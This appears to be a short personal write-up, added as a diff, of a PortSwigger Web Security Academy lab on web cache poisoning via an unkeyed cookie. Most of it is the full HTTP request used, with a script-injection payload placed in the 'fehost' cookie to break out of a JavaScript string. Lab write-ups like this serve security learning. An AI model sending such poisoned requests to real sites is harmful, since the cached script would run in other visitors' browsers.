@@ -1,0 +1,18 @@
+Web cache poisoning with an unkeyed cookie
+
+Slightly tricky to get working. Here's the request I used, it includes the cache buster and the payload:
+
+GET / HTTP/1.1
+Host: ac331f3b1e5ceaeb807503f1009f00d9.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-with-an-unkeyed-cookie?1235
+Cookie: session=hw6aQOBAzDiPbXD56r2U738XZlCkTnfy; fehost=someString"-alert(1)-"someString
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+In my case I only had to send it once to trigger the lab completion.
